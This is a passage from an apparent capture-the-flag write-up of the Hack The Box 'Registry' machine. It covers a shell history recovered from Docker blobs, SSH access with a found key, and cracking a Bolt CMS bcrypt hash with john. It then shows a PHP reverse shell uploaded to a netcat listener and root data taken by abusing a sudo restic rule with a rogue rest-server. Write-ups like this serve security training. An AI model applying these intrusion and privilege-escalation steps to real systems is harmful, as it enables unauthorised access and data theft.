&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;vi /etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;/etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;vi /etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;/etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;ssh registry&lt;/span&gt;
&lt;span class="code-line"&gt;ping registry.htb&lt;/span&gt;
&lt;span class="code-line"&gt;apt install ping&lt;/span&gt;
&lt;span class="code-line"&gt;apt install iputils-ping&lt;/span&gt;
&lt;span class="code-line"&gt;ping registry.htb&lt;/span&gt;
&lt;span class="code-line"&gt;cat .ssh/id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;ssh registry&lt;/span&gt;
&lt;span class="code-line"&gt;cd /etc/profile.d/&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;cp 01-ssh.sh 02-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;vi 01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;ssh 01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x 01-&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x 01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;./01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;kill 11162 11241 11365&lt;/span&gt;
&lt;span class="code-line"&gt;ssh registry&lt;/span&gt;
&lt;span class="code-line"&gt;cat /etc/profile&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;cd /root/&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cat .profile&lt;/span&gt;
&lt;span class="code-line"&gt;vi .profile&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;cat /etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;vi .profile&lt;/span&gt;
&lt;span class="code-line"&gt;eval `ssh-agent -s`&lt;/span&gt;
&lt;span class="code-line"&gt;vi .profile&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;systemctl restart nginx.service&lt;/span&gt;
&lt;span class="code-line"&gt;/etc/init.d/nginx start&lt;/span&gt;
&lt;span class="code-line"&gt;/etc/init.d/php7.2-fpm start&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cd /var/www/html/&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;vi sync.sh&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x sync.sh&lt;/span&gt;
&lt;span class="code-line"&gt;./sync.sh&lt;/span&gt;
&lt;span class="code-line"&gt;apt install rsync&lt;/span&gt;
&lt;span class="code-line"&gt;./sync.sh&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;/etc/profile.d/01-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;/etc/profile.d/02-ssh.sh&lt;/span&gt;
&lt;span class="code-line"&gt;./sync.sh&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;rm -rf bolt/&lt;/span&gt;
&lt;span class="code-line"&gt;./sync.sh&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cd bolt/&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cd ..&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;rm -rf bolt&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cat sync.sh&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;kill 11412 11531&lt;/span&gt;
&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
&lt;span class="code-line"&gt;cd /&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;cd /home/&lt;/span&gt;
&lt;span class="code-line"&gt;l&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The blob
&lt;code&gt;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&lt;/code&gt;
doesn't seems to contain anything.&lt;/p&gt;
&lt;p&gt;The blob
&lt;code&gt;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&lt;/code&gt;
contain some &lt;code&gt;apt&lt;/code&gt; list.&lt;/p&gt;
&lt;p&gt;The blob
&lt;code&gt;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&lt;/code&gt;
contain a full file system. But no passwords in &lt;code&gt;/etc/shadow&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The blob
&lt;code&gt;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&lt;/code&gt; does
not contain anything interesting.&lt;/p&gt;
&lt;p&gt;The blob
&lt;code&gt;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&lt;/code&gt; is
quit big there is a full file system in it. In the &lt;code&gt;/root/.ssh/&lt;/code&gt; folder we find
another SSH key and a SSH config file (the &lt;code&gt;/etc/shadow&lt;/code&gt; doesn't contain any
password).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Host registry&lt;/span&gt;
&lt;span class="code-line"&gt;  User bolt&lt;/span&gt;
&lt;span class="code-line"&gt;  Port 22&lt;/span&gt;
&lt;span class="code-line"&gt;  Hostname registry.htb&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The SSH key let us connect as bolt on the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ssh 10.10.10.159 -l bolt -i blobs/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;blobs/id_rsa&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;System information disabled due to load higher than 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Tue Dec  3 13:48:57 2019 from 10.10.15.222&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:~$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;ytc0ytdmnzywnzgxngi0zte0otm3ywzi&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
&lt;p&gt;We start our enumeration.&lt;/p&gt;
&lt;p&gt;In &lt;code&gt;/var/www/html/&lt;/code&gt; we found a PHP script used for backup. This script call the
&lt;code&gt;restic&lt;/code&gt; binary with the &lt;code&gt;sudo&lt;/code&gt; rights.
As this is a script the user running it probably don't need to input a
password. As this is in &lt;code&gt;/var/www/html/&lt;/code&gt; this is probably run by the &lt;code&gt;www-data&lt;/code&gt;
user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /var/www/html/backup.php&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?php shell_exec(&amp;quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="bolt-archive"&gt;Bolt archive&lt;/h2&gt;
&lt;p&gt;We also found a backup archive on the system &lt;code&gt;/var/backup/blot.tgz&lt;/code&gt;. We &lt;code&gt;scp&lt;/code&gt; it on our
box and decompress it. This is a clone of https://github.com/bolt/bolt on the
branch &lt;code&gt;3.6&lt;/code&gt;. We can check that the commit match with &lt;code&gt;tig&lt;/code&gt; and the &lt;a href="https://github.com/bolt/bolt/commit/a3bbe38afcc591e37ded6d0efe47bb197ae63687"&gt;github
repository&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="tig" src="/media/2020.04/registry_2.png"&gt;&lt;/p&gt;
&lt;p&gt;A &lt;code&gt;git status&lt;/code&gt; inform us that nothing was modify (from &lt;code&gt;git&lt;/code&gt; point of view).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git status&lt;/span&gt;
&lt;span class="code-line"&gt;On branch 3.6&lt;/span&gt;
&lt;span class="code-line"&gt;Your branch is up to date with &amp;#39;origin/3.6&amp;#39;.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;nothing to commit, working tree clean&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So we look at the files listed in &lt;code&gt;.gitignore&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id="appconfig"&gt;app/config&lt;/h3&gt;
&lt;p&gt;The file &lt;code&gt;config.yml&lt;/code&gt; tell us that there is sqlite database named bolt. The
other files does not contain useful information.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;head app/config/config.yml&lt;/span&gt;
&lt;span class="code-line"&gt;# Database setup. The driver can be either &amp;#39;sqlite&amp;#39;, &amp;#39;mysql&amp;#39; or &amp;#39;postgres&amp;#39;.&lt;/span&gt;
&lt;span class="code-line"&gt;#&lt;/span&gt;
&lt;span class="code-line"&gt;# For SQLite, only the databasename is required. However, MySQL and PostgreSQL&lt;/span&gt;
&lt;span class="code-line"&gt;# also require &amp;#39;username&amp;#39;, &amp;#39;password&amp;#39;, and optionally &amp;#39;host&amp;#39; ( and &amp;#39;port&amp;#39; ) if the database&lt;/span&gt;
&lt;span class="code-line"&gt;# server is not on the same host as the web server.&lt;/span&gt;
&lt;span class="code-line"&gt;#&lt;/span&gt;
&lt;span class="code-line"&gt;# If you&amp;#39;re trying out Bolt, just keep it set to SQLite for now.&lt;/span&gt;
&lt;span class="code-line"&gt;database:&lt;/span&gt;
&lt;span class="code-line"&gt;    driver: sqlite&lt;/span&gt;
&lt;span class="code-line"&gt;    databasename: bolt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="appdatabase"&gt;app/database&lt;/h3&gt;
&lt;p&gt;We can access the database using &lt;code&gt;sqlite3&lt;/code&gt; (which is available by default on a
Kali install). We list the available tables and the data from the &lt;code&gt;bolt_users&lt;/code&gt;
and &lt;code&gt;bolt_authtoken&lt;/code&gt;. We got a password hash.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sqlite3 app/database/bolt.db&lt;/span&gt;
&lt;span class="code-line"&gt;SQLite version 3.30.1 2019-10-10 20:19:45&lt;/span&gt;
&lt;span class="code-line"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
&lt;span class="code-line"&gt;sqlite&amp;gt; .tables&lt;/span&gt;
&lt;span class="code-line"&gt;bolt_authtoken    bolt_field_value  bolt_pages        bolt_users&lt;/span&gt;
&lt;span class="code-line"&gt;bolt_blocks       bolt_homepage     bolt_relations&lt;/span&gt;
&lt;span class="code-line"&gt;bolt_cron         bolt_log_change   bolt_showcases&lt;/span&gt;
&lt;span class="code-line"&gt;bolt_entries      bolt_log_system   bolt_taxonomy&lt;/span&gt;
&lt;span class="code-line"&gt;sqlite&amp;gt; select * from bolt_users;&lt;/span&gt;
&lt;span class="code-line"&gt;1|admi|$2y$10$hcuhBWxp7Ypk8Wx.LUpEguihXr60tiDeh46v3cSy7wvKnQSq/Kre2|thek27@gmail.com|2019-05-29 11:02:18|192.168.50.1|Admin|[]|1||||0||[&amp;quot;root&amp;quot;,&amp;quot;everyone&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;sqlite&amp;gt; select * from bolt_authtoken;&lt;/span&gt;
&lt;span class="code-line"&gt;1|1||5ce26d1b34ecf3405469c50ef01e044793c71db8da07e4705fc995a0bd964505|05fde348656e16b2589424fb7d175372|2019-05-29 11:02:18|192.168.50.1|Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36|2019-06-12 11:02:18&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can use &lt;code&gt;sqlite&amp;gt; .schema bolt_users&lt;/code&gt; to show the columns name (for the
bolt_users table).&lt;/p&gt;
&lt;p&gt;We try to brute force the password has using john. The hash algorithm is bcrypt and
the password doesn't seems to be on the rockyou top 10 000 (+ the three passwords found
earlier).&lt;/p&gt;
&lt;h3 id="production-db"&gt;Production DB&lt;/h3&gt;
&lt;p&gt;We are working on the backup database. Let us just get the "production" one.
And dump the same table. The hash is different.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;scp bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db ./&lt;/span&gt;
&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;/root/.ssh/id_rsa&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;bolt.db    100%  296KB  65.2KB/s   00:04&lt;/span&gt;
&lt;span class="code-line"&gt;sqlite3 bolt.db&lt;/span&gt;
&lt;span class="code-line"&gt;SQLite version 3.30.1 2019-10-10 20:19:45&lt;/span&gt;
&lt;span class="code-line"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
&lt;span class="code-line"&gt;sqlite&amp;gt; select * from bolt_users;&lt;/span&gt;
&lt;span class="code-line"&gt;1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-12-04 12:58:05|10.10.16.58|Admin|[&amp;quot;files://ls.php.png&amp;quot;]|1||||0||[&amp;quot;root&amp;quot;,&amp;quot;everyone&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;2|test|$2y$10$8GeiNSHiL3pAlMyRvjY2seroSOYQnvRKmZxk/iadII3lKPYhsvh1S|a@a.a|2019-12-04 09:09:13|10.10.14.218|testingtege|[&amp;quot;files://166912.jpg&amp;quot;]|1||||0||[&amp;quot;editor&amp;quot;,&amp;quot;chief-editor&amp;quot;,&amp;quot;admin&amp;quot;,&amp;quot;developer&amp;quot;,&amp;quot;guest&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;everyone&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This time john is more efficient and we found the password almost immediately.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john  hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;bcrypt&amp;quot;, but the string is also recognized as &amp;quot;bcrypt-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=bcrypt-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 1 (iteration count) is 1024 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;strawberry       (?)&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2019-12-04 16:38) 0.2439g/s 87.80p/s 87.80c/s 87.80C/s strawberry..brianna&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="bolt-cms"&gt;Bolt CMS&lt;/h2&gt;
&lt;p&gt;We go to the &lt;a href="https://bolt.cm/"&gt;bolt&lt;/a&gt; login interface.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Bolt login interface" src="/media/2020.04/registry_3.png"&gt;&lt;/p&gt;
&lt;p&gt;We connect as admin using the cracked password (&lt;code&gt;strawberry&lt;/code&gt;).
There is a menu to upload some files. But the PHP files are not authorized.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Bolt dashboard" src="/media/2020.04/registry_4.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Upload files interface" src="/media/2020.04/registry_8.png"&gt;&lt;/p&gt;
&lt;p&gt;As we are admin we can change this configuration in the "configuration/main
configuration" menu.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Configuration menu" src="/media/2020.04/registry_5.png"&gt;&lt;/p&gt;
&lt;p&gt;We just add the PHP files in the authorized extension and save the
configuration.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Configuration menu, adding PHP" src="/media/2020.04/registry_7.png"&gt;&lt;/p&gt;
&lt;p&gt;We can then upload our PHP reverse shell (from
&lt;code&gt;/usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt;). Pointing to our local
&lt;code&gt;netcat&lt;/code&gt; running as bolt.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;set_time_limit&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;// CHANGE THIS&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4343&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;       &lt;span class="c1"&gt;// CHANGE THIS&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$chunk_size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1400&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="Reverse shell uploaded" src="/media/2020.04/registry_9.png"&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:~$ nc -l -p 4343&lt;/span&gt;
&lt;span class="code-line"&gt;Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;span class="code-line"&gt;14:06:37 up  2:50,  2 users,  load average: 0.14, 0.08, 0.02&lt;/span&gt;
&lt;span class="code-line"&gt;USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT&lt;/span&gt;
&lt;span class="code-line"&gt;bolt     pts/2    10.10.15.63      11:35    2:21   0.01s  0.00s nc -l -p 4343&lt;/span&gt;
&lt;span class="code-line"&gt;bolt     pts/3    10.10.15.1       13:31   53.00s  0.03s  0.03s -bash&lt;/span&gt;
&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
&lt;span class="code-line"&gt;$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note: all the above operation must be done "quickly" as the bolt's
configuration and the uploaded files are reset every few minutes.&lt;/strong&gt; Once you get
the reverse shell the reset won't impact you anymore.&lt;/p&gt;
&lt;h2 id="www-data"&gt;www-data&lt;/h2&gt;
&lt;p&gt;Now that we are &lt;code&gt;www-data&lt;/code&gt; we can check our previous assumptions regarding its
&lt;code&gt;sudo&lt;/code&gt; rights.&lt;/p&gt;
&lt;p&gt;:::text
  $ sudo -l
  Matching Defaults entries for www-data on bolt:
      env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/p&gt;
&lt;p&gt;User www-data may run the following commands on bolt:
      (root) NOPASSWD: /usr/bin/restic backup -r rest*&lt;/p&gt;
&lt;p&gt;We read carefully the &lt;code&gt;restic&lt;/code&gt; &lt;a href="https://restic.readthedocs.io"&gt;documentation&lt;/a&gt;.
The most interesting pages are:
* &lt;a href="https://restic.readthedocs.io/en/stable/040_backup.html"&gt;How to backup data&lt;/a&gt;
* &lt;a href="https://restic.readthedocs.io/en/stable/030_preparing_a_new_repo.html"&gt;How to create a new repository&lt;/a&gt;
* &lt;a href="https://restic.readthedocs.io/en/stable/030_preparing_a_new_repo.html#rest-server"&gt;And more specificaly how to run a REST repository&lt;/a&gt;
* &lt;a href="https://github.com/restic/rest-server"&gt;The github repository of the REST server&lt;/a&gt;
* &lt;a href="https://restic.readthedocs.io/en/stable/050_restore.html"&gt;How to restore a backup&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;From there we upload a complied GO binary of rest-server from the
&lt;a href="https://github.com/restic/rest-server/releases"&gt;github project&lt;/a&gt;
to the box using the bolt SSH account.&lt;/p&gt;
&lt;p&gt;We create a directory in &lt;code&gt;/tmp/&lt;/code&gt;, upload our binary and create another
directory for our backups.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp$ mkdir ioio2&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp$ cd ioio2&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;rest-server-0.9.7-linux-amd64&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ chmod +x rest-server-0.9.7-linux-amd64&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ mkdir srv&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We imitate the &lt;code&gt;restic&lt;/code&gt; repository in our folder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ restic init --repo ./srv/&lt;/span&gt;
&lt;span class="code-line"&gt;enter password for new repository:&lt;/span&gt;
&lt;span class="code-line"&gt;enter password again:&lt;/span&gt;
&lt;span class="code-line"&gt;created restic repository b421a8c9a1 at ./srv/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Please note that knowledge of your password is required to access&lt;/span&gt;
&lt;span class="code-line"&gt;the repository. Losing your password means that your data is&lt;/span&gt;
&lt;span class="code-line"&gt;irrecoverably lost.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run the server with the debug option.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ ./rest-server-0.9.7-linux-amd64 --path /tmp/ioio2/srv/  --debug&lt;/span&gt;
&lt;span class="code-line"&gt;rest-server 0.9.7 compiled with go1.10 on linux/amd64&lt;/span&gt;
&lt;span class="code-line"&gt;Data directory: /tmp/ioio2/srv/&lt;/span&gt;
&lt;span class="code-line"&gt;Authentication disabled&lt;/span&gt;
&lt;span class="code-line"&gt;Private repositories disabled&lt;/span&gt;
&lt;span class="code-line"&gt;Starting server on :8000&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With our &lt;code&gt;www-data&lt;/code&gt; webshell we put the repository password in a file and
backup the whole &lt;code&gt;/root/&lt;/code&gt; directory.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ echo lol &amp;gt; /tmp/l&lt;/span&gt;
&lt;span class="code-line"&gt;$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ -p /tmp/l /root/&lt;/span&gt;
&lt;span class="code-line"&gt;scan [/root]&lt;/span&gt;
&lt;span class="code-line"&gt;[0:00] 10 directories, 14 files, 28.066 KiB&lt;/span&gt;
&lt;span class="code-line"&gt;scanned 10 directories, 14 files in 0:00&lt;/span&gt;
&lt;span class="code-line"&gt;[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;duration: 0:00&lt;/span&gt;
&lt;span class="code-line"&gt;snapshot 485d9809 saved&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Back to our bolt SSH shell we can check the snapshots in our
repository (yes I did some test with the bolt user. That's how I discover that I
was prompted for password).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ restic -r ./srv/ snapshots&lt;/span&gt;
&lt;span class="code-line"&gt;enter password for repository:&lt;/span&gt;
&lt;span class="code-line"&gt;password is correct&lt;/span&gt;
&lt;span class="code-line"&gt;ID        Date                 Host        Tags        Directory&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;91587cbd  2019-12-05 15:20:31  bolt                    /home/bolt&lt;/span&gt;
